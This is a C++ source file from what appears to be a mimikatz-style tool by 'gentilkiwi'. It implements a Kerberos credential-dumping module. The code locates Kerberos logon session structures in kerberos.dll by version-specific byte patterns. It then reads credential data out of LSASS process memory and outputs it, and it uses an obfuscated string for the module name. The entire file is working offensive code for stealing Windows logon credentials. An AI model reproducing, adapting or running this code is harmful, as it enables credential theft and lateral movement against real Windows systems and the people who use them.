/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by-nc-sa/3.0/
	This file  : http://creativecommons.org/licenses/by/3.0/
*/
#include <Windows.h>
#include <Psapi.h>

#include "..\lpmemory.h"
#include "..\..\inc\dbg.h"
#include "..\..\inc\mem.h"				
#include "..\..\inc\CryptoStrings.h"		

#include "kerberos.h"

KERBEROS_MODULE_CONTEXT kerbContext;


VOID kerb_InitGlobals()
{
	memset(&kerbContext, 0, sizeof(KERBEROS_MODULE_CONTEXT));
}


bool searchKerberosFuncs(LP_MODULE_CONTEXT *pContext)
{
	LPWSTR wszKerberos;

#ifdef _M_X64
	BYTE PTRN_WALL_KerbUnloadLogonSessionTable[]= {0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d};
	LONG OFFS_WALL_KerbUnloadLogonSessionTable	= sizeof(PTRN_WALL_KerbUnloadLogonSessionTable);

	BYTE PTRN_WALL_KerbFreeLogonSessionList[]	= {0x48, 0x3b, 0xfe, 0x0f, 0x84};
	LONG OFFS_WALL_KerbFreeLogonSessionList		= -4;
#elif defined _M_IX86
	BYTE PTRN_WNO8_KerbUnloadLogonSessionTable[]= {0x85, 0xc0, 0x74, 0x1f, 0x53};
	LONG OFFS_WNO8_KerbUnloadLogonSessionTable	= -(3 + 4);
	BYTE PTRN_WIN8_KerbUnloadLogonSessionTable[]= {0x85, 0xc0, 0x74, 0x2b, 0x57}; // 2c au lieu de 2b pour avant le RC
	LONG OFFS_WIN8_KerbUnloadLogonSessionTable	= -(6 + 4);

	BYTE PTRN_WALL_KerbFreeLogonSessionList[]	= {0xeb, 0x0f, 0x6a, 0x01, 0x57, 0x56, 0xe8};
	LONG OFFS_WALL_KerbFreeLogonSessionList		= -4;
#endif
	if (pContext->pModKERBEROS && !(kerbContext.KerbGlobalLogonSessionTable || kerbContext.KerbLogonSessionList))
	{
		PBYTE *pointeur = NULL; PBYTE pattern = NULL; ULONG taille = 0; LONG offset = 0;

		if (pContext->GLOB_Version.dwMajorVersion < 6)
		{
			pointeur = reinterpret_cast<PBYTE *>(&kerbContext.KerbLogonSessionList);
			pattern	= PTRN_WALL_KerbFreeLogonSessionList;
			taille	= sizeof(PTRN_WALL_KerbFreeLogonSessionList);
			offset	= OFFS_WALL_KerbFreeLogonSessionList;

			if (pContext->GLOB_Version.dwMinorVersion < 2)
				kerbContext.offsetMagic = 8;
		}
		else
		{
			pointeur = reinterpret_cast<PBYTE *>(&kerbContext.KerbGlobalLogonSessionTable);

#ifdef _M_X64
			pattern	= PTRN_WALL_KerbUnloadLogonSessionTable;
			taille	= sizeof(PTRN_WALL_KerbUnloadLogonSessionTable);
			offset	= OFFS_WALL_KerbUnloadLogonSessionTable;
#elif defined _M_IX86
			if (pContext->GLOB_Version.dwBuildNumber < 8000)
			{
				pattern	= PTRN_WNO8_KerbUnloadLogonSessionTable;
				taille	= sizeof(PTRN_WNO8_KerbUnloadLogonSessionTable);
				offset	= OFFS_WNO8_KerbUnloadLogonSessionTable;
			}
			else
			{
				if (pContext->GLOB_Version.dwBuildNumber < 8400) // petite correction pour avant la RC
					PTRN_WIN8_KerbUnloadLogonSessionTable[3] = 0x2c;
				pattern	= PTRN_WIN8_KerbUnloadLogonSessionTable;
				taille	= sizeof(PTRN_WIN8_KerbUnloadLogonSessionTable);
				offset	= OFFS_WIN8_KerbUnloadLogonSessionTable;
			}
#endif
		}

		wszKerberos = CRSTRW("kerberos", "\x00\xc0\x40\x0e\x08\xc0\x4b\x03\x02\xda\xa5\xf4\xff\x2b\xdf");

		if (HMODULE monModule = LoadLibrary(wszKerberos))
		{
			MODULEINFO mesInfos;
			if(GetModuleInformation(GetCurrentProcess(), monModule, &mesInfos, sizeof(MODULEINFO)))
			{
				lp_genericPatternSearch(pointeur, wszKerberos, pattern, taille, offset);
				*pointeur += pContext->pModKERBEROS->modBaseAddr - reinterpret_cast<PBYTE>(mesInfos.lpBaseOfDll);
			}
			FreeLibrary(monModule);
		}

		my_free(wszKerberos);

	}
	return (pContext->pModKERBEROS && (kerbContext.KerbGlobalLogonSessionTable || kerbContext.KerbLogonSessionList));
}

bool WINAPI getKerberosLogonData(LP_MODULE_CONTEXT *pContext, __in PLUID logId)
{
	if (searchKerberosFuncs(pContext))
	{
		PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds = NULL;
		DWORD taille;
		BYTE * monBuff = NULL;
		
		if (kerbContext.KerbGlobalLogonSessionTable)
		{
			taille = sizeof(KIWI_KERBEROS_PRIMARY_CREDENTIAL);
			monBuff = new BYTE[taille];
			
			if (PKIWI_KERBEROS_PRIMARY_CREDENTIAL pLogSession = reinterpret_cast<PKIWI_KERBEROS_PRIMARY_CREDENTIAL>(lpgetPtrFromAVLByLuid(pContext, kerbContext.KerbGlobalLogonSessionTable, FIELD_OFFSET(KIWI_KERBEROS_PRIMARY_CREDENTIAL, LocallyUniqueIdentifier), logId)))
			{
				if (lp_readMemory(pLogSession, monBuff, taille, pContext->hLSASS))
				{
					pLogSession = reinterpret_cast<PKIWI_KERBEROS_PRIMARY_CREDENTIAL>(monBuff);
					mesCreds =  &pLogSession->credentials;
				}
			}
		}
		else
		{
			taille = sizeof(KIWI_KERBEROS_LOGON_SESSION) + kerbContext.offsetMagic;
			monBuff = new BYTE[taille];
			if (PKIWI_KERBEROS_LOGON_SESSION pLogSession = reinterpret_cast<PKIWI_KERBEROS_LOGON_SESSION>(lpgetPtrFromLinkedListByLuid(pContext, reinterpret_cast<PLIST_ENTRY>(kerbContext.KerbLogonSessionList), FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier) + kerbContext.offsetMagic, logId)))
			{
				if (lp_readMemory(pLogSession, monBuff, taille, pContext->hLSASS))
				{
					pLogSession = reinterpret_cast<PKIWI_KERBEROS_LOGON_SESSION>(monBuff);
					if (kerbContext.offsetMagic != 0)
						pLogSession = reinterpret_cast<PKIWI_KERBEROS_LOGON_SESSION>(reinterpret_cast<PBYTE>(pLogSession)+kerbContext.offsetMagic);
					mesCreds =  &pLogSession->credentials;
				}
			}
		}
		#ifdef _DEBUG
			pContext->wszPackageName = L"kerberos";
		#endif
		lpgenericCredsToStream(pContext, mesCreds, FALSE);
		delete [] monBuff;

	} //else { DbgPrint("ERR: kerberos not avail"); }

	return true;
}
